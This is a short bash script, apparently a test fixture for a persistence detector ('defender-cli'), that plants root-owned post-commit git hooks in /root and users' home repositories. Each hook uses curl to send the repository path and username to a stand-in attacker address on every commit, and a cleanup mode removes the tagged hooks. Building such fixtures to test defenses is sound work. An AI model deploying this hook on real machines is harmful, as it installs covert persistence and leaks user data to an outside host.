#!/usr/bin/env bash
# Git hook persistence: a post-commit hook in /root that exfils on every commit.
# Detected by: defender-cli anti-persistence --git-hooks
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

ATTACKER_IP="${ATTACKER_IP:-10.0.0.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"
# Plant in /root and /home if any user repos exist
HOOKS=()
for candidate in /root /home/*; do
    [[ -d "$candidate/.git/hooks" ]] && HOOKS+=("$candidate/.git/hooks/post-commit")
done
# Always plant in /root/.git even if it has to be created
HOOKS+=("/root/.git/hooks/post-commit")
TAG="DEFENDER-TEST-git-hook"

case "${1:-}" in
  deploy)
    for hook in "${HOOKS[@]}"; do
      mkdir -p "$(dirname "$hook")"
      cat > "$hook" << EOF
#!/bin/sh
# $TAG
curl -s "http://${ATTACKER_IP}:${ATTACKER_PORT}/exfil?repo=\$(pwd)&user=\$(whoami)" -o /dev/null 2>/dev/null || true
EOF
      chmod +x "$hook"
      echo "[+] 15_git_hook: hook installed at $hook"
    done
    ;;
  cleanup)
    for hook in "${HOOKS[@]}"; do
      if grep -q "$TAG" "$hook" 2>/dev/null; then
        rm -f "$hook"
        echo "[-] 15_git_hook: removed $hook"
      fi
    done
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
